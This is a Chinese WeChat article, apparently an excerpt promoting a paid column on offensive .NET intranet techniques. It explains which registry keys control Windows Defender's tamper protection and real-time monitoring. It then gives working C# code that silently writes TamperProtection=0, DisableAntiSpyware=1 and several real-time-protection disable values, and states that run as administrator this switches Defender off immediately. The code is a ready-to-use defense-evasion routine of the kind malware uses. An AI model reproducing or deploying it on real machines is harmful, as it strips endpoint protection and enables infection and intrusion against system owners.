---
title: .NET内网实战：通过修改注册表关闭Windows Defender
url: https://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247497381&idx=2&sn=d9c43a8f194ceaca9ac403730220feb7&chksm=fa595848cd2ed15ea86349cb6d151ac67bad4b764623b133dcde2222d8df60ab5b591a5de23f&scene=58&subscene=0#rd
source: dotNet安全矩阵
date: 2024-12-11
fetch_date: 2025-10-06T19:41:32.100373
---

# .NET内网实战：通过修改注册表关闭Windows Defender

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibXibiaRyFPI439dFybReKxQoEIb5f0K8Zicib4ld1WtTWWwvlwAZnn0FnIoAWqVakmuUdPL5mgjAU3cg/0?wx_fmt=jpeg)

# .NET内网实战：通过修改注册表关闭Windows Defender

原创

专攻.NET安全的

dotNet安全矩阵

01

阅读须知

此文所节选自小报童《.NET 内网实战攻防》专栏，主要内容有.NET在各个内网渗透阶段与Windows系统交互的方式和技巧，对内网和后渗透感兴趣的朋友们可以订阅该电子报刊，解锁更多的报刊内容。

02

基本介绍

本文内容部分节选自小报童《.NET 通过修改注册表关闭Windows Defender》，完整的文章内容请加入小报童后订阅查看。现在限时只需59元，永久买断！目前已有280+位朋友抢先预定，我们会长期更新，对.NET内网安全的朋友们请尽快订阅该报刊！

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1YibXibiaRyFPI439dFybReKxQoNSETwsgD6qdmUgRg1y1MTLTbKeibxkEdlH6VX60Xvk2Ljh5hDASAhjA/640?wx_fmt=png&from=appmsg)

03

原理分析

在渗透测试、红队演习或某些特殊的网络安全操作中，禁用或绕过 Windows Defender 等安全软件可能是攻击者常见的目标之一，Windows Defender 是 Windows 操作系统自带的防病毒软件，能够提供实时保护，防止恶意软件和其他安全威胁的侵害。

## 3.1 篡改保护

篡改保护是 Windows Defender 的一项重要功能，用于防止恶意程序或用户未经授权修改安全设置。

```
```
计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Features
```
```

此路径下 TamperProtection 键值，如果是1表示启用，用户可通过Windows安全中心图形界面或命令行启用或禁用该功能，执行regedit.exe命令启动注册表编辑器，如下图所示。

![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibXibiaRyFPI439dFybReKxQoRH1iaUnOLWWpqo1kzENQkR7dfibogtVsMcOlKveyKicVO80EHZGkhagPw/640?wx_fmt=other&from=appmsg)

## 3.2 行为监控

行为监控是 Windows Defender 的一项实时保护功能，用于分析应用程序和进程的行为，检测潜在威胁，也可以通过注册表修改 Windows Defender 行为监控功能的各种安全设置，注册表路径如下所示。

```
```
计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection
```
```

DisableBehaviorMonitoring 键值 为1，表示行为监控功能关闭，不再分析和检测恶意行为，如下图所示。

![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibXibiaRyFPI439dFybReKxQonibTYs3M0XmXTDoxicbPTBOE7dosWy0V29daqPt3KDKKK3zwBQ4RwgTw/640?wx_fmt=other&from=appmsg)

## 3.3 修改注册表键对

我们定义了一个 RegistryEdit 方法，用于修改 Windows 注册表中的指定键值对。如果指定的注册表键不存在，它将创建该键并设置值。如果键已经存在并且值不同，则更新值，具体代码如下所示。

```
```
private static void RegistryEdit(string regPath, string name, string value)
{
			try
			{
				using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(regPath, RegistryKeyPermissionCheck.ReadWriteSubTree))
				{
					if (registryKey == null)
					{
						Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, value, RegistryValueKind.DWord);
					}
					else if (registryKey.GetValue(name) != value)
					{
						registryKey.SetValue(name, value, RegistryValueKind.DWord);
					}
				}
			}
			catch
			{
			}
}
```
```

上述代码中，通过 Registry.LocalMachine.OpenSubKey 打开指定路径下的注册表项。ReadWriteSubTree 权限表示，可以读写该注册表路径的所有子项。

最后，通过调用 Program.RegistryEdit 方法编辑多个注册表项，包括篡改防护、防病毒功能、行为监控、访问保护和实时扫描，具体代码如下所示。

```
```
Program.RegistryEdit("SOFTWARE\\Microsoft\\Windows Defender\\Features", "TamperProtection", "0");
Program.RegistryEdit("SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", "1");
Program.RegistryEdit("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBehaviorMonitoring", "1");
Program.RegistryEdit("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableOnAccessProtection", "1");
Program.RegistryEdit("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableScanOnRealtimeEnable", "1");
```
```

这段代码通过调用 RegistryEdit 方法，目的是关闭或禁用 Windows Defender 的一些功能。运行后， Windows Defender 自动关闭，如下图所示。

![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibXibiaRyFPI439dFybReKxQojo8prsPZJeCzXfrdrCFgXiasvRjKhsbvOfK6oNlo8HXAWBZnOvcMJTQ/640?wx_fmt=other&from=appmsg)

综上，以管理员权限运行，这样对系统的关键注册表进行修改，修改注册表后，Windows Defender 的核心服务和功能即刻停用，无需重启或手动干预。想要了解完整或者更多的内网安全方向的文章，可以移步订阅小报童《.NET 内网实战攻防》电子报刊。

04

**欢迎加入.NET 电子报刊**

我们的小报童电子报刊【.NET内网安全攻防】也开始运营，引入小报童也是为了弥补知识星球对于轻量级阅读支持的不足，为用户读者提供更佳的阅读体验。如果您对阅读体验的需求比较高，那么可以订阅这个专栏。

本次电子报刊《.NET 内网安全攻防》专栏，内容主要有.NET在各个内网渗透阶段与Windows系统交互的方式和技巧，可细分为以下8个方向。

```
1） .NET 安全防御绕过
2） .NET 本地权限提升
3） .NET 内网信息收集
4） .NET 内网代理通道
5） .NET 内网横向移动
6） .NET 目标权限维持
7） .NET 数据传输外发
8） .NET 目标痕迹清理
```

原价899，现在限时只需59元，永久买断！目前已有280+位朋友抢先预定，我们会长期更新，初步计划保持每周更新1-2篇新内容，对.NET内网安全的朋友们请尽快订阅该报刊！![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibeicvDNVldcXTgRnFUFTwOqfTleogJThU7kCaZJuuU2BLVLYluu6CFV7BX458AxBcd93ickZ0rmOqQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

每增加五十人涨价10元，抓紧订阅，超值！订阅后请关注公众号：dotNet安全矩阵，发送订单截图和您的微信号，邀请您加入专属交流群。感兴趣的朋友，可以点击链接：https://xiaobot.net/p/dotNetAttack，或者扫描下方海报微信二维码加入即可，订阅后小报童定时会将最新内容通过微信推送给您。

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1YibXibiaRyFPI439dFybReKxQoa5OnhetdDKdnd36lG844cFIWNaib1adpRCXOJbRb6mVicfic8tLqXl9Pw/640?wx_fmt=png&from=appmsg)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y8uc3CokHvGlrE00icPjW7AdTgEXkDtRT81Bbiaibx9gpMD6thAiawO5vz0icNlUzrzaOf6g044Tnzv3sQ/0?wx_fmt=png)

dotNet安全矩阵

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y8uc3CokHvGlrE00icPjW7AdTgEXkDtRT81Bbiaibx9gpMD6thAiawO5vz0icNlUzrzaOf6g044Tnzv3sQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过